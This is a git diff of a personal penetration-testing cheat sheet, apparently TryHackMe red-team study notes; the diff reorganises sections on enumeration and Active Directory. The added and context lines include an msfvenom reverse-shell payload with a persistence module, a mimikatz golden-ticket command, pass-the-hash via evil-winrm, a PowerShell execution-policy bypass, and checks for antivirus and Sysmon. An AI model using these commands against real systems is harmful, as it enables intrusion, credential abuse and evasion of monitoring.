@@ -9,7 +9,6 @@
     - [John](#john)
     - [Hydra](#hydra)
   - [Phishing](#phishing)
-  - [Lay of the Land](#lay-of-the-land)
   - [Shell](#shell)
     - [Priv Escalation](#priv-escalation)
       - [shared libraries](#shared-libraries)
@@ -24,7 +23,12 @@
 - [Metasploit with database](#metasploit-with-database)
   - [Meterpreter (payload)](#meterpreter-payload)
   - [Recoinaissance](#recoinaissance)
-- [Basic Enum](#basic-enum)
+- [BASIC ENUM](#basic-enum)
+  - [LINUX](#linux)
+    - [Existing Tools](#existing-tools)
+  - [Windows](#windows)
+    - [DNS, SMB, SNMP](#dns-smb-snmp)
+    - [External Tools](#external-tools)
 - [Web hacking](#web-hacking)
   - [Subdomain](#subdomain)
   - [Wildcards](#wildcards)
@@ -60,12 +64,12 @@
 - [Attack strategies](#attack-strategies)
   - [Active Directory](#active-directory)
     - [Commands](#commands)
-  - [kereberos](#kereberos)
-  - [basic post-exploit](#basic-post-exploit)
-    - [powerview](#powerview)
+  - [KERBEROS](#kerberos)
+    - [POWERVIEW](#powerview)
     - [bloodhound](#bloodhound)
     - [mimikatz](#mimikatz)
     - [maintaining access](#maintaining-access)
+    - [Lay of the Land](#lay-of-the-land)
 - [Network assessment](#network-assessment)
   - [Steps](#steps-2)
   - [PIVOTING](#pivoting)
@@ -228,42 +232,6 @@
 - Droppers
   - poison, downloaded file
 
-## Lay of the Land
-- Identify segemtns: vlans, dmz, 
-- netstat- na
-  - find open ports
-- arp -a = find neighbors
-- systeminof
-  - part of Active Directory (workgroup / domain)
-  
-- Find AV
-  - wmic
-  - Get-CimInstance
-  - Get-Servive WinDefend
-  - Get-MpComputerStatus
-  - get-Netfirewallprofile
-  - Test-NetConnection 
-
-- Logs
-  - sysmon: logger
-    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
-    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
-    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
-    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
-    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
-    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
-
-- IDS, IPDS, Endpoint Detection and Response
-
-- Enumerate services, hidden folders and process, shared files/printers
-- wmic product get name,version
-  - wmic service where "name like 'name'" get Name,Version,Pathname
-- get-ChildItem -Hidden -Path C:\Users\NANE
-- get-Process -Name
-- netstat -noa
-- net start
-
-
 ## Shell
 - Reverse:
   - target: 
@@ -406,7 +374,101 @@
  - From services google for vulnerabilities /also search in metasploit
  - Common services: http, ftp, smb, ssh, rdp
 
-# Basic Enum
+# BASIC ENUM
+
+- User/groups
+- hostnames
+- routing tables
+- network shared/services
+- application / banner
+- firewall
+- service
+- snmp, dns
+- credentials
+
+## LINUX
+
+### Existing Tools
+- ls /etc/*release = version, os
+- hostname
+  
+- var/mail
+- /usrbin/ /sbin/ = installed apps
+- rpm -qa = query packages
+- dpkg -l = debian
+- who
+- w = more powerfull
+- id
+- last = who used
+- sudo -l = commands for invoking user
+  
+- netstat
+  - -a = all listening/non-listening
+  - -l = listening
+  - -n = numero, 
+  - -t = tcp
+  - -u = udp
+  - -x = unix
+  - -p = process id
+  - find open ports
+- arp -a = find neighbors
+- lsof = List Open Files
+  - -i = internet
+
+- ps
+  - -e = all
+  - -f = more info
+  - -l = long format
+  - -ax/aux = comparable
+  - -j = job format
+
+## Windows
+- systeminfo
+- wmic
+  - wmic qfe get Caption, Description = updates
+  - wmic product get name,version,vendor
+- Get-CimInstance
+- Get-Servive WinDefend
+- Get-MpComputerStatus
+- get-Netfirewallprofile
+- Test-NetConnection 
+- net start = started services
+- whoami 
+  - /priv
+  - /groups
+- net 
+  - user
+  - group
+  - localgroup [administrators]
+  - accounts /domain
+  - share
+
+- ipconfig
+  - /all
+
+- netstat
+  - -a all
+  - -b binary connection
+  - -n not resolving ip
+  - -o PID
+  - 
+
+### DNS, SMB, SNMP
+- dig
+  - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
+- SMB
+  - Server Message Bloc
+  - net share
+
+- SNMP
+  - Simple Network Management Protocol
+  - snmpcheck
+  - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.
+
+
+
+### External Tools
+
 - enum4linux IP_
 - metasploit (smb/enum || ssh/enum)
 - gobuster / ffuf
@@ -725,9 +787,7 @@ admin123' UNION SELECT SLEEP(5),2;--
 - check permision
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
 
-
-
-- 
+- powershell.exe
   
 ## Stabilize and Post Exploit windows
 - Create user + add group admin
@@ -802,7 +862,6 @@ admin123' UNION SELECT SLEEP(5),2;--
   - -Searchbase "CN=Users,DC=THMREDTEAM,DC=COM"
     - Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
 
-
 - port 139/445
 - Enum4linux = Enumerate
 - kerbrute = brute force in kerberus active directory
@@ -815,7 +874,7 @@ admin123' UNION SELECT SLEEP(5),2;--
 - Pass the hash
   - evil-winrm -i IP -u USERNAME -H hash
 
-## kereberos
+## KERBEROS
 - authentication service
 - ticket system
 - Enumerate users
@@ -826,9 +885,9 @@ admin123' UNION SELECT SLEEP(5),2;--
   - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
   - msic::cmd ==> access other machine
 
-## basic post-exploit
 
-### powerview
+
+### POWERVIEW
 - enumrate domains on windows
   - powershell -ep bypass ==> allow run script
   - . .\PowerView.ps1
@@ -866,6 +925,49 @@ admin123' UNION SELECT SLEEP(5),2;--
   - msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
   - use exploit/multi/handler
   - use exploit/windows/local/persistence
+
+### Lay of the Land
+- Identify segemtns: vlans, dmz, 
+- netstat
+  - -a = all listening/non-listening
+  - -l = listening
+  - -n = numero, 
+  - -t = tcp
+  - -u = udp
+  - -x = unix
+  - -p = process id
+  - find open ports
+- arp -a = find neighbors
+- systeminof
+  - part of Active Directory (workgroup / domain)
+  
+- Find AV
+  - wmic
+  - Get-CimInstance
+  - Get-Servive WinDefend
+  - Get-MpComputerStatus
+  - get-Netfirewallprofile
+  - Test-NetConnection 
+
+- Logs
+  - sysmon: logger
+    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
+    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
+    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+- IDS, IPDS, Endpoint Detection and Response
+
+- Enumerate services, hidden folders and process, shared files/printers
+- wmic product get name,version
+  - wmic service where "name like 'name'" get Name,Version,Pathname
+- get-ChildItem -Hidden -Path C:\Users\NANE
+- get-Process -Name
+- netstat -noa
+- net start
+
 
 # Network assessment
 - Requirements: 
